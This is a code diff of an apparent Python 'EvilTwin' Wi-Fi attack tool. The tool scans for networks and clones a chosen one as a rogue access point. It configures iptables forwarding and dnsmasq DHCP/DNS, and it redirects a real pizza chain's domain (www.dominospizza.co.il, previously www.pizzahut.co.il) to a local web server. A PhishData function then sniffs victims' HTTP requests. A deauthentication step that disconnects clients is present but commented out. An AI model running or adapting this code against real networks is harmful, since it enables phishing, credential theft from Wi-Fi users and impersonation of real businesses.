@@ -75,7 +75,7 @@ def iptablesPassthru():
     '''
     # The following iptable command is forwarding the postrouting (after routing the ip)  to enp1s0
     os.system('iptables --table nat --append POSTROUTING --out-interface enp1s0 -j MASQUERADE')
-    # This command tells iptables t accept (forward) all traffic from the wifi adapter.
+    # This command tells iptables to accept (forward) all traffic from the wifi adapter.
     os.system('iptables --append FORWARD --in-interface wlxc83a35c2e0b8 -j ACCEPT')
     # Command which enables packets forwarding (since we want to listen to incoming connections)
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
@@ -88,10 +88,8 @@ def scanWifi(pkt):
             # It contains all the information about the network. Beacon frames are transmitted periodically,
             # they serve to announce the presence of a wireless LAN and to synchronise the members of the service set.
             # Beacon frames are transmitted by the access point (AP)
-            if not (pkt.info.decode(
-                    "utf-8") in wifiNetworks):  # Check to see if the network is not already in the Dictionary
-                wifiNetworks[pkt.info.decode("utf-8")] = (
-                    pkt.addr3, 1)  # (pkt.addr3, 1) is needed because this is how the scanning works (otherwise no MAC)
+            if not (pkt.info.decode("utf-8") in wifiNetworks):  # Check to see if the network is not already in the Dictionary
+                wifiNetworks[pkt.info.decode("utf-8")] = (pkt.addr3, 1)  # (pkt.addr3, 1) is needed because this is how the scanning works (otherwise no MAC)
         else:
             pass
     else:
@@ -133,22 +131,17 @@ def dhcpStarter(adapterName):  # Lets construct a dnsmasq conf file
     dnsIP = apIP
     listenAddr = '127.0.0.1'
     netmask = '255.255.255.0'
-    apacheIP = NetworkInterfaces.ifaddresses('enp1s0')[NetworkInterfaces.AF_INET][0]['addr']
-    text = 'interface=%s\n' \
-           'dhcp-range=%s\n' \
-           'dhcp-option=3,%s\n' \
-           'dhcp-option=6,%s\n' \
-           'server=8.8.8.8\n' \
-           'listen-address=%s\n' \
-           'listen-address=192.168.1.1\n' \
-           'addn-hosts=dnsmasq.hosts' \
+    apacheIP = '10.0.0.18'
+    text = 'port=0\ninterface=%s\ndhcp-range=%s\ndhcp-option=3,%s\n' \
+           'dhcp-option=6,%s\nserver=8.8.8.8\nlisten-address=%s\n' \
+           'listen-address=192.168.1.1\naddn-hosts=dnsmasq.hosts' \
            % (adapterName, ipRangeWithTTL, apIP, dnsIP, listenAddr)
     # Write the Ddnsmasq config file
     f = open(nameConfFile, mode='w')
     f.write(text)
     f.close()
     # write the host of the apache server
-    CreateHostsDNSmasq(apacheIP, 'www.pizzahut.co.il')
+    CreateHostsDNSmasq(apacheIP, 'www.dominospizza.co.il')
 
     # Set the IP of the monitoring interface to the GW and to the corresponding subnet
     os.system('ifconfig %s up %s netmask %s' % (adapterName, apIP, netmask))
@@ -178,7 +171,7 @@ def dataSniffer(adapterName):
 
 def PhishData(packet):  # Change only JSON related stuff
 
-    webSiteName = 'pizzahut'  # nameOfSite is a filter to process only http requests involving webSiteName string
+    webSiteName = '10.0.0.18'  # nameOfSite is a filter to process only http requests involving webSiteName string
     if packet.haslayer(HTTPRequest):  # If this packet is an HTTP Request
 
         url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()  # get the requested URL to string
@@ -226,9 +219,8 @@ def main():
         targetWifiIndex = input("Select a network run EvilTwin On: \t")
     networkToHack = targetWifiIndex
 
-    print(wifiNetworks[targetWifiIndex][0])
-    print('Disconnecting All clients at: %s' % networkToHack)
-    start_new_thread(DeauthAttack, (wifiNetworks[targetWifiIndex][0], adapterName,))
+    #print('Disconnecting All clients at: %s' % networkToHack)
+    #start_new_thread(DeauthAttack, (wifiNetworks[targetWifiIndex][0], adapterName,))
 
     print('Starting Duplicate EvilTwin Network similar to: %s' % networkToHack)
     start_new_thread(EvilTwinAP, (networkToHack, adapterName,))
@@ -239,7 +231,7 @@ def main():
     print('Starting DNS and DHCP Services for the Evil Twin AP')
     start_new_thread(dhcpStarter, (adapterName,))
 
-    time.sleep(5)
+    time.sleep(10)
 
     print('Ready To Provide DHCP Services')
     start_new_thread(DetectNewDevices, (adapterName,))
